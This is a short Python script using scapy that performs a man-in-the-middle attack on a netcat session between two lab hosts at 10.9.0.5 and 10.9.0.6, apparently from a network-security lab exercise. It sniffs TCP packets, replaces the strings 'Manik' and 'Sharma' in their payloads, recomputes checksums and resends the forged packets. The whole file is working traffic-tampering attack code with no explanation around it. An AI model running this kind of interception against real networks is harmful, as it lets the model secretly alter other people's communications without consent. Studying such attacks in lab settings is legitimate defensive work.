#!/usr/bin/env python3
from scapy.all import *

VM_A_IP = '10.9.0.5'
VM_B_IP = '10.9.0.6'

print("MIMT on Netcat")

def spoof_pkt(pkt):
	if pkt[IP].src == VM_A_IP and pkt[IP].dst == VM_B_IP and pkt[TCP].payload:
		real = pkt[TCP].payload.load
		data =  real.replace(b'Manik',b'AAAAA')
		#payload_after = len(data)
		#payload_diff = payload_after - payload_before
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload) 
		del(newpkt[TCP].chksum)
		#newpkt[IP].len = pkt[IP].len + payload_diff
		newpkt = newpkt/data
		newpkt.show()
		send(newpkt, verbose = False)
	elif pkt[IP].src == VM_B_IP and pkt[IP].dst == VM_A_IP:
		real = pkt[TCP].payload.load
		data =  real.replace(b'Sharma',b'BBBBBB')
		#payload_after = len(data)
		#payload_diff = payload_after - payload_before
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload) 
		del(newpkt[TCP].chksum)
		#newpkt[IP].len = pkt[IP].len + payload_diff
		newpkt = newpkt/data
		newpkt.show()
		send(newpkt, verbose = False)
		
pkt = sniff(filter='tcp',prn=spoof_pkt)
